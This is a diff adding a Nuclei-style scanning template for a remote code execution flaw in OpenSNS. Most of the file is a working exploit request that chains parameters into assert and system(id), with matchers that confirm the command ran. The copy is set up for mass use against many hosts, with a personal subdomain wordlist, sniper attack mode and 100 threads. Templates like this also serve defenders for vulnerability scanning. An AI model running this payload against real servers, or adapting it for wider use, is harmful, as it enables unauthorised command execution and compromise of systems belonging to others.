@@ -1,0 +1,42 @@
+id: opensns-rce 2
+
+info:
+  name: OpenSNS Remote Code Execution Vulnerability
+  author: gy741
+  severity: critical
+  reference: |
+      - http://www.0dayhack.net/index.php/2417/
+      - https://www.pwnwiki.org/index.php?title=OpenSNS_%E9%81%A0%E7%A8%8B%E4%BB%A3%E7%A2%BC%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E
+  tags: opensns,rce
+
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
+      - |
+        GET /index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(id) HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
+        Connection: close
+        Accept: */*
+        Accept-Language: en
+        Accept-Encoding: gzip
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "((u|g)id=)"
+          - "Microsoft Windows"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - "/Application/"
+
+      - type: status
+        status:
+          - 200
